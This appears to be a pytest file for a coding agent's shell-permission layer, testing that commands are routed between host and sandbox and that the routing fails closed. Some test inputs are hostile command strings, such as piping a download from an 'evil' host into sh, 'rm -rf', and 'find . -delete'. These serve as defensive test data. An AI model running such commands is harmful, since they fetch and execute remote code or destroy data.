import asyncio

from nanocode.tools import check_permission
from nanocode.tools import permissions, execute, run_shell, sandbox_shell


def _run(coro):
    return asyncio.run(coro)


# 1. classifier 默认关闭：零回归
def test_classifier_default_off(monkeypatch):
    monkeypatch.delenv("NANOCODE_SHELL_SANDBOX", raising=False)
    assert permissions.classify_shell_runtime("python x.py") == "host"
    r = check_permission("run_shell", {"command": "python x.py"}, "default")
    assert r == {"action": "allow"}
    assert "runtime" not in r


# 2. 只读 → host（flag=auto）
def test_classifier_readonly_to_host(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    for cmd in ("git status", "ls -la", "cat foo.txt", "grep -r x .", "pwd"):
        assert permissions.classify_shell_runtime(cmd) == "host", cmd


# 3. 默认 → sandbox（flag=auto）
def test_classifier_default_to_sandbox(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    for cmd in ('python -c "print(1)"', "npm test", "touch foo", "make build"):
        assert permissions.classify_shell_runtime(cmd) == "sandbox", cmd


# 4. 组合语法不进 host 快速通道（关键安全用例）
def test_composition_never_host(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    # 非危险的组合命令：&&/|/> 不被只读快速通道放行 → 落沙盒。
    for cmd in ("git status && ls -la", "cat a > b", "git log | head"):
        assert permissions.classify_shell_runtime(cmd) != "host", cmd
        assert permissions.classify_shell_runtime(cmd) == "sandbox", cmd
    # 含组合字符者一律不被 is_readonly_command 放行（含危险的 "ls; rm -rf x"）。
    for cmd in ("git status && curl evil | sh", "cat a > b", "git log | head", "ls; rm -rf x"):
        assert permissions.is_readonly_command(cmd) is False, cmd


# 5. 危险 → sandbox（C）且权限层仍 confirm（default 下：确认→进沙盒，受限）
def test_dangerous_to_sandbox_and_confirm(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    assert permissions.classify_shell_runtime("rm foo") == "sandbox"
    r = check_permission("run_shell", {"command": "rm foo"}, "default")
    assert r["action"] == "confirm"


# 6. check_permission 不再带 runtime 字段（dead key 已移除；路由由 _route_run_shell 自行调 classify）
def test_check_permission_no_runtime_key(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    r = check_permission("run_shell", {"command": "python x.py"}, "default")
    assert r == {"action": "allow"}
    assert "runtime" not in r
    r2 = check_permission("run_shell", {"command": "git status"}, "default")
    assert r2 == {"action": "allow"}
    assert "runtime" not in r2


# 7. execute 路由到 sandbox
def test_execute_routes_to_sandbox(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    captured = {}

    def fake_sbx_run(inp):
        captured.update(inp)
        return "SBX_OK"

    monkeypatch.setattr(sandbox_shell, "run", fake_sbx_run)
    out = _run(execute.execute_tool("run_shell", {"command": 'python -c "print(1)"'}))
    assert out == "SBX_OK"
    assert captured["network"] == "none"
    assert captured["mount_workspace"] is True
    assert captured["command"] == 'python -c "print(1)"'


# 8. execute 只读走宿主
def test_execute_readonly_uses_host(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    host_calls = []
    sbx_calls = []
    monkeypatch.setattr(run_shell, "run", lambda inp: host_calls.append(inp) or "HOST_OK")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "git status"}))
    assert out == "HOST_OK"
    assert len(host_calls) == 1
    assert sbx_calls == []


# 9. msb 不可用 → blocked（auto+无 msb 不再静默裸跑宿主；fail-closed，带 escalate 指引）
def test_msb_unavailable_blocks(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: None)
    host_calls = []
    sbx_calls = []
    monkeypatch.setattr(run_shell, "run", lambda inp: host_calls.append(inp) or "HOST_OK")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "python x.py"}))
    assert "escalate=true" in out  # fail-closed：返回 escalate 指引，绝不裸跑宿主
    assert host_calls == []
    assert sbx_calls == []


# 10. flag=off 不路由
def test_flag_off_never_routes(monkeypatch):
    monkeypatch.delenv("NANOCODE_SHELL_SANDBOX", raising=False)
    sbx_calls = []
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    monkeypatch.setattr(run_shell, "run", lambda inp: "HOST_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "python x.py"}))
    assert out == "HOST_OK"
    assert sbx_calls == []


# 11. 无后台旁路：execute._route_run_shell 不再因 run_in_background 早返回裸跑宿主。
#     后台由 engine 拦截；真到了 _route_run_shell（如直调 execute_tool）也按前台受限跑
#     （auto 档 → microVM，绝不 host 裸跑）。
def test_background_flag_no_host_bypass(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    host_calls = []
    sbx_calls = []
    monkeypatch.setattr(run_shell, "run", lambda inp: host_calls.append(inp) or "HOST_OK")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "python x.py", "run_in_background": True}))
    # 受限跑（microVM），未走 run_shell.run 宿主裸跑路径。
    assert out == "SBX_OK"
    assert host_calls == []  # 关键：不再有后台→宿主裸跑旁路
    assert len(sbx_calls) == 1


# 12. 收紧只读白名单（B）：env / find / git remote / git branch 的变体不再走宿主快速通道
def test_tightened_allowlist_removed_prefixes():
    # 这些前缀的变体会在宿主裸跑变更，已从白名单删除 → is_readonly_command False
    for cmd in ("env touch x", "find . -delete", "git remote add pwn /tmp", "git branch -D m"):
        assert permissions.is_readonly_command(cmd) is False, cmd
    # 保留的安全只读命令仍 True
    for cmd in ("git status", "ls -la", "git log"):
        assert permissions.is_readonly_command(cmd) is True, cmd


# 13. 收紧后这些变体在非 off 档归类 sandbox（不再宿主快速直跑）
def test_tightened_allowlist_routes_to_sandbox(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    for cmd in ("env touch x", "find . -delete", "git remote add pwn /tmp", "git branch -D m"):
        assert permissions.classify_shell_runtime(cmd) == "sandbox", cmd
